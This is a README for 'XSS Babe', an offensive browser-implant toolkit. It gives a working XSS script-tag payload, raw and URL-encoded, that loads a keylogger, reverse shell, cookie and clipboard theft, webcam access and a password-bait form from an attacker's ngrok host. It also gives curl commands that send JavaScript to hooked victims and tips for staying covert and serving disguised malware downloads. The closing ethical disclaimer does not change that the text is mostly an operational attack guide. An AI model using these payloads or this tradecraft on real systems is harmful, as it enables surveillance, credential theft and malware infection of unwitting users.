# XSS Babe – by ekoms savior

**XSS Babe** is a browser-based red team implant system built entirely in JavaScript and Python. It is designed for ethical cybersecurity research, browser exploitation simulation, and educational purposes. XSS Babe dynamically loads multiple payload modules into a victim's browser using a single script tag.

This tool is ideal for understanding the power of XSS-based post-exploitation, teaching students browser abuse tactics, and building real-time control panels for red team operations.

---

## Features

- Keylogger with live keystroke logging  
- JavaScript-based reverse shell command execution  
- Screenshot capture using HTML2Canvas  
- Fingerprinting (user-agent, screen resolution, timezone)  
- Browser recon and port scanning  
- Clipboard capture  
- Webcam access prompt  
- Browser history profiling  
- Password bait module with fake login form  
- Download button that serves real payloads  
- Cross-tab messaging to capture user activity across tabs  
- Dynamic auto-loader that pulls all modules from the server  
- Optional Discord webhook alerts for real-time victim beacons  
- Dashboard interface for viewing logs  

---

## Prerequisites

- Python 3  
- Pip (`pip3`)  
- A Ngrok account (free) and binary installed  
- A basic understanding of using the terminal  

---

## Installation Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/ekomsSavior/xss_babe.git
   cd xss_babe
   ```

2. **Run the setup script**
   This installs dependencies, sets up folders, and starts the Flask server.
   ```bash
   chmod +x setup_repo.sh
   ./setup_repo.sh
   ```

---

##  Ngrok Setup Instructions (Full Walkthrough)

To run XSS Babe over the internet, you’ll need to tunnel the server using **Ngrok**.

** Step 1: Install Ngrok** — Download the binary from [https://ngrok.com/download](https://ngrok.com/download). For Kali Linux or Debian-based systems:  
```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

** Step 2: Sign Up & Get Your Auth Token** — Create a free account at [https://ngrok.com/signup](https://ngrok.com/signup), then copy your token from [https://dashboard.ngrok.com/get-started/setup](https://dashboard.ngrok.com/get-started/setup) and run:  
```bash
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

** Step 3: Start the Flask Server** — From your project directory, run:  
```bash
python3 server.py
```

** Step 4: Start Ngrok Tunnel** — In a new terminal window:
```bash
ngrok http 5000
```

Ngrok will give you a public URL like:
```
https://abc123.ngrok.io
```

Use this domain in all injected payloads and external links.

---

## How to Use the Payload

Once Ngrok is running and you have your public domain:

1. Inject this payload into a vulnerable XSS point:
   ```html
   <script src="https://abc123.ngrok.io/static/x.js"></script>
   ```

2. If you need it URL-encoded:
   ```
   %3Cscript%20src%3D%22https%3A%2F%2Fabc123.ngrok.io%2Fstatic%2Fx.js%22%3E%3C%2Fscript%3E
   ```

This will dynamically load all modules into the victim’s browser, including keylogger, reverse shell, recon, and more.

---

## Viewing Logs and Interacting with Victims

### Live Dashboard

Visit your dashboard from your browser to see logs in real time:
```
https://abc123.ngrok.io/
```

### Command Execution

Send JavaScript to all infected browsers:
```bash
curl -X POST https://abc123.ngrok.io/cmd -d "alert('This is a test')"
```

Example of something stealthier:
```bash
curl -X POST https://abc123.ngrok.io/cmd -d "document.body.style.background='black'"
```

The shell module fetches commands every 2 seconds and executes them silently.

---

## Maintaining Browser Access

Once a victim is hooked:

- Do not spam alert boxes — this creates suspicion  
- Use the `shell.js` module to run background JS tasks  
- Use `password_bait.js` to simulate login prompts during inactivity  
- Use `tab_messenger.js` to track movement between tabs  
- Avoid reloading the browser tab — that will clear JS execution  
- Track screenshots, clipboard, keystrokes, and tabs in real-time  
- Use Discord webhook alerts to notify you when a browser is hooked  

---

## Using Real Payloads

XSS Babe delivers **real payloads**. You may place the following in your `/payloads` folder:

- `reverse_shell.zip` – zipped payload  
- `chrome_patch.exe` – real malicious binary for simulation  
- `malware_scan_tool.apk` – Android APK for testing on phones  
- `password_list.txt` – used in bait or as decoy  

In `fake_download.js`, change the download URL to your real payload:
```js
window.location = "/payloads/reverse_shell.zip";
```

Use only in controlled environments and with full authorization.

---

## Maintaining XSS Babe

Tips and tricks for best results:

- Restart `server.py` after editing Python or JS files  
- Add or remove modules by editing `static/x.js`  
- Log files are stored in `logs/victims.txt`  
- Add your real payloads to the `/payloads` directory  
- Customize `dashboard.html` to match your engagement branding  
- Keep `.gitignore` in place to avoid pushing payloads or logs to GitHub  
- Check browser CSP headers — some sites block external scripts  
- Use Ngrok TLS (`https://`) to avoid mixed content blocking  

---

## Directory Structure

```
xss_babe/
├── server.py
├── setup_repo.sh
├── .gitignore
├── logs/
│   └── victims.txt
├── payloads/
│   ├── reverse_shell.zip
│   ├── chrome_patch.exe
│   ├── password_list.txt
│   └── malware_scan_tool.apk
├── static/
│   ├── x.js
│   ├── keylogger.js
│   ├── shell.js
│   ├── auto_cookie_steal.js
│   ├── webcam.js
│   ├── clipboard.js
│   ├── fingerprint.js
│   ├── screenshot.js
│   ├── recon.js
│   ├── history.js
│   ├── password_bait.js
│   ├── fake_download.js
│   └── tab_messenger.js
├── templates/
│   └── dashboard.html
```

---

## Ethical Statement

XSS Babe is an offensive security research tool.

It is intended only for use in:
- Your own labs  
- Authorized red team engagements  
- Security training environments  

Never deploy XSS Babe on a live system without explicit written permission. 
Misuse of this tool may be illegal.
the user assumes all risk when using this tool. 
ekomsSavior provides this tool without warranty.

---

